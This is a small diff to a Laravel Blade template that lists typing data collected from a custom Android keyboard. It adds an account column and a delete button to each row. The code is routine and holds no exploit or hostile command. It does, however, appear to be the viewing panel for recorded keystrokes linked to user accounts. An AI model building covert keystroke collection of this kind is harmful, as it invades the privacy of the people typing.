@@ -12,6 +12,7 @@ Typing info collected from a custom made Android keyboard.
 <th>#</th>
 <th>Text</th>
 <th>Date</th>
+<th>Account</th>
 @endsection
 
 @section('info') 
@@ -20,6 +21,13 @@ Typing info collected from a custom made Android keyboard.
         <th>{{$l->id}} </th>
         <th>{{$l->text}} </th>
         <th>{{$l->date}} </th>
+        <th>{{$l->account}} </th>
+        <th>
+        {!!Form::open(['action' => ['KeyboardController@destroy', $l->id], 'method' => 'POST', 'class' => 'pull-right'])!!}
+        {{Form::hidden('_method', 'DELETE')}}
+        {{Form::submit('Delete', ['class' => 'btn btn-danger'])}}
+        {!!Form::close()!!}
+        </th>
 </tr> 
 @endforeach
 @endsection
